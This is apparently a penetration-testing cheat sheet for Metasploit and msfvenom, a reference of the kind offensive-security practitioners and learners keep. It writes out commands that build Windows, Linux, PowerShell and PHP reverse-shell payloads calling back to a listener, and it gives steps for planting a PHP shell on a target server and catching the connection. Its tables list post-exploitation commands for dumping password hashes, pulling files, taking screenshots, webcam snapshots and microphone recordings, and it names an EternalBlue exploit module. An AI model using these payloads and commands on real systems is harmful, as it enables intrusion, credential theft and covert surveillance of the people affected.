## 1. Payload Generation with `msfvenom`

### Basic Payload Creation
```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <format> > <output_file>
```
- **`-p <payload>`**: Specify the payload type (e.g., `windows/meterpreter/reverse_tcp`, `linux/x86/shell/reverse_tcp`).
- **`-f <format>`**: Output format (e.g., `exe`, `elf`, `apk`, `raw`, `psh`).
- **`LHOST`**: Your listening IP address.
- **`LPORT`**: Your listening port.

Example for Windows:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > payload.exe
```

Example for Linux:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > payload.elf
```

Example for PowerShell:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh > payload.ps1
```

---

## 2. Converting a Reverse Shell to Meterpreter
If you already have a reverse shell, you can upgrade it to a Meterpreter session:
```bash
use post/multi/manage/shell_to_meterpreter
set SESSION <session_id>
run
```

---

## 3. Creating a Listener Payload 

```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
```

---

## 4. Creating a PHP Payload 
Generate PHP Meterpreter payload:
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.php
```

Place `shell.php` on the target server. When executed via the web browser, it will connect back to your listener.

Start listener in Metasploit:
```bash
use exploit/multi/handler
set PAYLOAD php/meterpreter_reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
```

---

## 5. Meterpreter Commands

| Command                           | Description                        |
| --------------------------------- | ---------------------------------- |
| `sysinfo`                         | Display system information.        |
| `getuid`                          | Show current user.                 |
| `getsystem`                       | Attempt privilege escalation.      |
| `hashdump`                        | Dump password hashes.              |
| `search -f <filename>`            | Search for files.                  |
| `download <file>`                 | Download a file from the target.   |
| `upload <file>`                   | Upload a file to the target.       |
| `screenshot`                      | Take a screenshot of the target.   |
| `webcam_snap`                     | Take a snapshot from the webcam.   |
| `record_mic`                      | Record audio from the microphone.  |
| `shell`                           | Spawn a standard shell.            |
| `background`                      | Send session to background.        |
| `sessions -i <id>`                | Interact with a specific session.  |
| `post/windows/gather/enum_shares` | Enumerate shared files on Windows. |
| `post/linux/gather/hashdump`      | Dump hashes on Linux.              |

---

## 6. Metasploit Commands

| Command                        | Description                                                                    |
| ------------------------------ | ------------------------------------------------------------------------------ |
| `search <keyword>`             | Search for exploits, payloads, or auxiliary modules related to a keyword.      |
| `search type:exploit name:<x>` | Search specifically for exploits containing `<x>` in their name.               |
| `search type:payload`          | List all payloads.                                                             |
| `use <module_path>`            | Load a specific module (e.g., `use exploit/windows/smb/ms17_010_eternalblue`). |
| `info`                         | Show detailed information about the loaded module.                             |
| `show payloads`                | Show compatible payloads for the loaded module.                                |
| `show exploits`                | List available exploits.                                                       |
| `show options`                 | Show configurable options for the loaded module.                               |
| `set <option> <value>`         | Set a specific option for the module.                                          |
| `exploit`                      | Run the loaded exploit.                                                        |
| `run`                          | Alias for `exploit`.                                                           |
| `sessions`                     | List active sessions.                                                          |
| `sessions -i <id>`             | Interact with a specific session.                                              |
| `jobs`                         | List background jobs.                                                          |
| `jobs -k <id>`                 | Kill a background job.                                                         |
| `load <plugin>`                | Load a Metasploit plugin.                                                      |
| `bg`                           | Quit the session                                                               |
| `sessions -k <ID>`             | Kill a session                                                                 |
